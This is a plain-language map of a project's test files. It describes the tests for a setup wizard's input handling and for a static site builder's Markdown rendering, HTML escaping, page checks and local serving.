@@ tests/test_providers.py WizardTests.test_an_environment_variable_that_wins_is_pointed_out @@
- Input that ends at once: nothing saved, exit code 1.
- `42` is answered with "please type a number from 1 to 9" and asked again.
- An answer starting with Windows PowerShell's byte-order mark is understood; with piped input a key is read like any
  answer, never with `getpass` (which would wait for the keyboard).
- A real `LOCALAGENT_PROVIDER` in the environment would beat the saved choice, and the setup says so.

@@ tests/test_providers.py footer @@
- Lets you run the file directly.

---
# `tests/test_site.py` — the website builder

**Role:** proves `tools/build_site.py`: the Markdown it renders, the problems its checks find, and a whole site built
from the real `docs\` and `website\`, checked, and served over HTTP. The download files are small stand-ins, so the
tests need no release build and no network. 17 tests, about 7 seconds.

## Helpers
@@ tests/test_site.py header @@
- Loads `tools/build_site.py` by its path (the `tools` folder is not a package) as `site`. `VERSION` is the agent's
  version, which the download file names contain.

@@ tests/test_site.py link @@
- The link rule of a tiny site with two pages, `cli` and `tools`: outside addresses and `#sections` stay, those two
  pages become `.html`, anything else is not on the site.

@@ tests/test_site.py Quiet @@
@@ tests/test_site.py Quiet.log_message @@
- The standard file server without a log line for every request.

@@ tests/test_site.py fake_dist @@
- Writes small stand-ins for the zip, the wheel and `SHA256SUMS.txt`.

## Inline Markdown
@@ tests/test_site.py InlineTests @@
@@ tests/test_site.py InlineTests.test_code_links_and_emphasis @@
@@ tests/test_site.py InlineTests.test_nothing_becomes_a_tag_or_a_placeholder @@
@@ tests/test_site.py InlineTests.test_words_with_marks_stay_as_they_are @@
@@ tests/test_site.py InlineTests.test_addresses @@
- `` `cli.md` `` becomes a link to `cli.html`; bold, italics, and a link whose label holds code all come out right.
- `<script>` is shown, never run; `&` is escaped; `{{name}}` becomes `&#123;&#123;name}}`, so it can never be taken for
  an unfilled template.
- `snake_case_name`, `17*3` and an escaped `\|` stay as written.
- A bare address leaves the full stop outside and keeps `&` working; `<https://...>` and an address in brackets
  become links; a link to a file that is not on the site shows only its label.

## Blocks
@@ tests/test_site.py BlockTests @@
@@ tests/test_site.py BlockTests.render @@
@@ tests/test_site.py BlockTests.test_headings_get_unique_ids @@
@@ tests/test_site.py BlockTests.test_paragraphs_lists_and_quotes @@
@@ tests/test_site.py BlockTests.test_tables_and_code @@
- Headings get ids (code keeps its underscore: `read_secret`), a second "Same" gets `same-2`, and only headings from
  level 2 on get a `#` link.
- A line starting with "2026." stays in its paragraph; a list starting at 3 keeps its number and its continuation
  lines and nested list; a blank line between items makes each item a paragraph; a quote holds a paragraph.
- A table with one-dash rules (`:-:`, `--:`) gets centred and right-aligned columns by class, fills a short row and
  keeps an escaped pipe inside code; a code block is escaped and named by its language; `---` is a rule.

## Pages and templates
@@ tests/test_site.py PageTests @@
@@ tests/test_site.py PageTests.test_titles_descriptions_order_and_templates @@
- Titles come from the first heading (a file name, a folder name, a guide's name); a long description is cut at a word
  with "..."; the menu puts a guide under "Get started", the overview under "How it is built", a code page under its
  area and an unknown page under "More"; a value that contains `{{b}}` is put in as it is, and a template asking for an
  unknown value stops the build; sizes read "101 KB" and "22.8 MB".

## The data in the pages
@@ tests/test_site.py DataTests @@
@@ tests/test_site.py DataTests.test_data_inside_a_page_cannot_break_it @@
@@ tests/test_site.py DataTests.test_release_facts_come_from_the_files @@
- Data holding `</script>` and `{{x}}` comes out with neither, yet reads back as the same data. A recorded session's
  lines come out escaped (`fix <it>` cannot become a tag) with the player's classes.
- The release date and notes are read from a changelog (and "not yet released" without one); a file's size and SHA-256
  are computed from the file (the known checksum of "abc").

@@ tests/test_site.py DataTests.test_the_setup_builder_follows_the_program @@
@@ tests/test_site.py DataTests.test_search_entries_follow_the_headings @@
- Server names become `lmstudio` and `llamacpp`; memory thresholds read "16 GB or more", "8 GB or more", "Less than 8
  GB". The setup builder's data starts with Gemini and OpenAI, its "skip" number is one past the last service (as in
  the real setup menu), Ollama is offered, and Gemini is chosen at first. The link rule keeps the site's own pages,
  turns documentation pages into their `.html`, and drops a file that is not on the site.
- A small rendered page gives three search entries — the page, then "One" and "Two" with their addresses and texts —
  without the code block and without the heading's `#` link.

## The whole site
@@ tests/test_site.py SiteTests @@
@@ tests/test_site.py SiteTests.build @@
- Builds with the test count replaced by 42: counting the real tests inside a test run is slow, and the real count is
  shown when the site is built for real.

@@ tests/test_site.py SiteTests.test_the_real_site_is_built_checked_and_served @@
- Builds the real site with an address and runs the full check with the **real** owner name read from git — so CI
  proves on every push that no page shows it. Every kind of page is written; the sitemap lists them and `robots.txt`
  names it; the search index has the guide. A local web server then serves the folder: the home page has its canonical
  link, the number of tests and the sessions; the download page links the zip with `download` and shows its checksum
  (computed from the stand-in file); a docs page marks itself in the menu; the zip arrives byte for byte; a missing
  page is a 404.

@@ tests/test_site.py SiteTests.test_downloads_can_live_elsewhere @@
@@ tests/test_site.py SiteTests.test_problems_are_found @@
@@ tests/test_site.py SiteTests.test_a_folder_that_is_not_a_site_is_never_replaced @@
@@ tests/test_site.py SiteTests.test_the_owner_is_read_from_the_remote @@
- With `--downloads-url` no download is copied, the download page links there, and the site still checks clean.
- A broken page is caught on every count: an unfilled placeholder, a wrong closing tag, a tag never closed, a missing
  file, a missing section, an inline style, an inline event handler, an inline script (but not a JSON data block),
  broken JSON, and a private name in a text file.
- A folder holding someone's own file is never deleted by a build into it; without release files the build stops.
- The owner comes from both forms of a GitHub address (`https://` and `git@`), with and without dashes; any other
  address gives nothing to look for.

@@ tests/test_site.py footer @@
- Lets you run the file directly.
